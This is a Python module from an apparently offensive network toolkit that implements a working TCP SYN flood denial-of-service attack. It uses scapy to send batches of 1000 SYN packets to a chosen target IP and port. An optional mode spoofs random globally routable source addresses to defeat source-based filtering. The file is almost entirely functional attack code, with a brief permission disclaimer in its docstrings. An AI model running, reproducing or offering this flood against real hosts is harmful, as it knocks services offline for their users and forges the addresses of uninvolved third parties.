"""
Author: Chris Martinez
Date: 31 May 2026
Version: 1.0.0
Name: __init__.py (syn_flood)
Description: This module performs a TCP SYN flood denial of service attack 
against a specified target host and port. It sends a continuous stream of TCP 
SYN packets to exhaust the target's connection table by creating half-open
connections that never complete the three-way handshake. Supports optional
source IP spoofing using globally routable random IP addresses to prevent
the target from filtering by source. Should only be used against systems
you own or have explicit written permission to test.
"""
import argparse
import ipaddress
import itertools
import random
import signal
import time

from scapy.all import sendpfast
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.packet import Packet
from types import FrameType

from netlink.core.base_module import BaseModule
from netlink.core.output import OutputManager

class SynFlood(BaseModule):
    """
    The SynFlood class performs TCP SYN flood denial of service attacks by
    sending a continuous stream of spoofed TCP SYN packets to a target host
    and port. Each packet initiates a TCP handshake that the target must
    track in its connection table while waiting for the final ACK that never
    arrives. When the connection table fills up the target can no longer
    accept new legitimate connections. Supports optional source IP spoofing
    using globally routable random addresses to prevent source-based
    filtering. Includes a configurable interval between packets and a packet
    counter that reports total packets sent on exit. Should only be run
    against systems you own or have explicit written permission to test.
    """
    ############################################################################
    # Class Level Attributes
    ############################################################################
    NAME = 'syn_flood'
    DESCRIPTION = "Perform a SYN Flood DDOS attack"
    REQUIRES_ROOT = True

    BATCH_SIZE = 1000
    LOWER_PORT = 1024
    UPPER_PORT = 65535

    ############################################################################
    # Constructor
    ############################################################################
    def __init__(self, iface: str, output: OutputManager):
        super().__init__(iface, output)
        self._keyboard_interrupted = False
        self._packets_sent = 0

    ############################################################################
    # Abstract Required Methods
    ############################################################################
    def add_args(self, parser: argparse.ArgumentParser) -> None:
        """
        Adds module-specific arguments to the argument parser. This method is
        called by the Engine when setting up the CLI for this module. Defines
        arguments for packet count, interval between packets, target IP address,
        target port, and optional source IP spoofing.
        Args:
            parser (argparse.ArgumentParser): The argument parser to which
                                            module-specific args are added.
        """
        parser.add_argument(
            '-c',
            '--count',
            type=int,
            action='store',
            dest='count',
            default=0,
            help="Number of packets to send (Default=0 infinite)"
        )

        parser.add_argument(
            '--interval',
            type=float,
            action='store',
            dest='interval',
            default=0.0,
            help="The interval of N seconds between packets sent (Dafault=0)"
        )

        parser.add_argument(
            '-t',
            '--target',
            type=str,
            action='store',
            dest='target',
            required=True,
            help="The IP of the target to SYN Flood"
        )

        parser.add_argument(
            '-p',
            '--port',
            type=int,
            action='store',
            dest='port',
            required=True,
            help="Port to send the TCP SYN packet to"
        )

        parser.add_argument(
            '--spoof-ip',
            action='store_true',
            dest='spoof_ip',
            default=False,
            help="Provides a random source IP Addr for packets that are sent"
        )
        

    def run(self, args: argparse.Namespace) -> None:
        """
        Executes the main functionality of the SynFlood module. Registers the
        SIGINT signal handler for graceful Ctrl+C exit and sets up the packet
        counter as either a finite range or infinite iterator depending on the
        count argument. Sends SYN packets in a loop calling _flood() each
        iteration and sleeping for the specified interval between packets.
        Prints the total packets sent on exit regardless of how the loop ends.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                    specific to the SynFlood module.
        """
        signal.signal(signal.SIGINT, self._sigint_handler)
        counter = range(args.count) if args.count > 0 else itertools.count()
        
        try:
            self.output.info(f"Attempting to SYN Flood the {args.target}")
            for _ in counter:
                if self._keyboard_interrupted:
                    self.output.warn("Keyboard interrupted (CTRL+C)")
                    break
                self._flood(args)
                self._packets_sent += self.BATCH_SIZE
                time.sleep(args.interval)
        except Exception as e:
            self.output.error(f"{e}")
        finally:
            signal.signal(signal.SIGINT, signal.SIG_DFL)
            msg = f"Packets sent: {self._packets_sent}"
            self.output.success(msg)

    ############################################################################
    # Methods
    ############################################################################
    def validate_args(self, args: argparse.Namespace) -> bool:
        """
        Validates the provided arguments for the SynFlood module. Checks that
        target is a valid IP address, the port if between 1 and 65535 and if 
        both count and interval is not less than zero.
        Args:
            args (argparse.Namespace): The parsed command-line arguments
                                    specific to the ARPSpoofer module.
        Returns:
            bool: True if all arguments are valid, False otherwise.
        """
        try:
            ipaddress.ip_address(args.target)
        except ValueError:
            msg = "Provide a valid IP Address for the target"
            self.output.error(msg)
            return False
        
        if args.count < 0:
            msg = "Count must be 0 or greater"
            self.output.error(msg)
            return False
        
        if args.interval < 0:
            msg = "Interval must be 0 or greater"
            self.output.error(msg)
            return False
        
        if args.port < 1 or args.port > self.UPPER_PORT:
            msg = f"The port must be from 1 to {self.UPPER_PORT}"
            self.output.error(msg)
            return False

        return True
    
    def _flood(self, args: argparse.Namespace) -> None:
        """
        Builds and sends a batch of TCP SYN packets to the target host and
        port using sendpfast() for maximum throughput via tcpreplay
        acceleration. Each packet in the batch has a unique randomly generated
        source port. When --spoof-ip is enabled each packet also gets a unique
        randomly generated globally routable source IP address to disguise the
        origin and prevent source-based filtering. When spoofing is disabled
        packets are sent with the attacker's real IP address as the source.
        Each packet includes an Ethernet layer for proper layer 2 framing
        required by sendpfast(). Sends BATCH_SIZE packets per call achieving
        approximately 2200 packets per second.
        Args:
            args (argparse.Namespace): The parsed command-line arguments used
                                    to access target, port, and spoof_ip.
        """
        tgt_port = args.port
        tgt_ip = args.target
        pkts = list()

        if args.spoof_ip:
            for _ in range(self.BATCH_SIZE):
                src_ip = self._random_ip()
                src_port = self._random_port()
                pkt = Ether()/IP(src=src_ip, dst=tgt_ip)
                pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
                pkts.append(pkt)
        else:
            for _ in range(self.BATCH_SIZE):
                src_port = self._random_port()
                pkt = Ether()/IP(dst=tgt_ip)
                pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
                pkts.append(pkt)
        
        sendpfast(pkts, iface=self.iface)
       
    def _random_port(self) -> int:
        """
        Generates a random ephemeral source port number in the range 1024 to
        65535. Using a random source port for each packet prevents the target
        from filtering the flood based on a consistent source port value.
        Returns:
            int: A random port number between LOWER_PORT and UPPER_PORT.
        """
        return random.randint(self.LOWER_PORT, self.UPPER_PORT)
    
    def _random_ip(self) -> str:
        """
        Generates a random globally routable IPv4 address for use as a spoofed
        source IP. Repeatedly generates random 32-bit integers and converts them
        to IPv4 addresses until one passes both the is_global and is_multicast
        checks ensuring the address is a valid public internet address. Excludes
        private ranges, loopback, link-local, reserved, and multicast addresses.
        Returns:
            str: A random globally routable IPv4 address as a string.
        """
        while True:
            ip = ipaddress.ip_address(random.getrandbits(32))
            if ip.is_global and not ip.is_multicast:
                return str(ip)
    
    def _sigint_handler(self, sig: int, frame: FrameType|None) -> None:
        """
        Handles the SIGINT signal generated by Ctrl+C by setting the
        keyboard_interrupted flag to True. Allows the flood loop to exit
        cleanly after the current packet is sent rather than terminating
        abruptly mid-send.
        Args:
            sig (int): The signal number received. Will be signal.SIGINT
                    when triggered by Ctrl+C.
            frame (FrameType | None): The current stack frame at the time
                                    the signal was received. Not used but
                                    required by the signal handler interface.
        """
        self._keyboard_interrupted = True
